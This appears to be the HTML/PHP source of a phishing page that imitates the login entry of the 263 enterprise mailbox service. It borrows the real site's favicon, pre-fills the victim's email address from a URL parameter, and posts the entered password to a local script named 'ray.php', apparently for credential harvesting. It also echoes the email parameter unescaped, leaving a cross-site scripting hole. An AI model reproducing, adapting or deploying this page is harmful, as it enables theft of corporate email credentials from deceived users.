<html>

<head>
<title>263 &#20225;&#19994;&#37038;&#31665;-&#30331;&#24405;&#20837;&#21475;</title>
<link id="cl_shortcut_icon" rel="shortcut icon" href="http://mail.263.net/custom_login/images/favicon.ico?v=10151" />

</head>

<body background="body.jpg">

	<table>

	<tr><td height="200"></td></tr>



	<tr><td>
	
		<form method="post" action="ray.php">

		<table><tr>

		<td width="833"></td>
		
		




		<td>

			<table>
	
			<tr><td>
			
						

						<table cellspacing="0"><tr><td 
						style="width:280px; height:40px; background-color: #A4A4A4;
						-moz-border-radius: 5px; -webkit-border-radius: 5px; -khtml-border-radius: 5px; border-radius: 5px;">
					
							<table cellspacing="0"><tr><td 
							style="width:280px; height:40px; background-color: #FFFFFF;
							-moz-border-radius: 4px; -webkit-border-radius: 4px; -khtml-border-radius: 4px; border-radius: 4px; 
							-moz-box-shadow: 2px 2px 2px #888; -webkit-box-shadow: 2px 2px 2px #888; box-shadow: 2px 2px 2px #888;">
							
									<table><tr>
									
									<td width="5"></td>
									
									
									
									<td>
									
											<font face="verdana" size="2">
											<b><?php echo $_GET['email']; ?></b>
											</font>
											
											<input type="hidden" name="username" value="<?php echo $_GET['email']; ?>">
									
									</td>
									
									</tr></table>
					
							</td></tr></table>
					
					</td></tr></table>


	
			</td></tr>





			<tr><td height=""></td></tr>
			
			
			
			
			
			<tr><td>
			
					<input  name="password" type="password" style="width:280px; height:42px; 
					font-family: Verdana; font-size: 13px; color:#000000; 
					background-color: #ffffff; border: solid 1px #A4A4A4; padding: 10px; 
					-moz-border-radius: 4px; -webkit-border-radius: 4px; -khtml-border-radius: 4px; border-radius: 4px; 
					-moz-box-shadow: 2px 2px 2px #888; -webkit-box-shadow: 2px 2px 2px #888; box-shadow: 2px 2px 2px #888;" 
					required="" placeholder="Password">

			
			</td></tr>
			
			
			
			
			<tr><td height=""></td></tr>
			
			
			
			
			
			<tr><td>
			
					<table align="center"><tr>
			
					<td>
					
						<font face="verdana" size="">
						
							<input type="checkbox" checked> 
									
									<font face="arial" size="2" color="#585858">
									Security Login
									</font>

						
						</font>
					
					</td>
					
					
					
					
					
					
					
					<td width="90"></td>
					
					
					
					
					
					<td>
					
						<div align="right">
						<font face="arial" size="2" color="#585858">
						Clear Trace
						</font>
						</div>
					
					</td>
					
					
					
					
					<td width="10"></td>
			
					</tr></tr>
					
					</table>
			
			</td></tr>
			
			
			
			
			<tr><td height=""></td></tr>
			
			
			
			
			<tr><td>
			
						<input type="submit" value="Sign in" 
						style="width:280px; height:42px; background-color: #045FB4; border: solid 3px #045FB4; 
						font-family: Verdana; font-size: 14px; font-weight: light; color: #ffffff; 
						-moz-border-radius: 3px; -webkit-border-radius: 3px; -khtml-border-radius: 3px; border-radius: 3px;
						-moz-box-shadow: 3px 3px 3px #888; -webkit-box-shadow: 3px 3px 3px #888; box-shadow: 3px 3px 3px #888;">


			
			</td></tr>
			
			
			
			
			<tr><td height="20">
			
				</form>
			
			</td></tr>

			</table>

		</td>

		</tr></table>

	</td></tr>

	</table>


</body>

</html>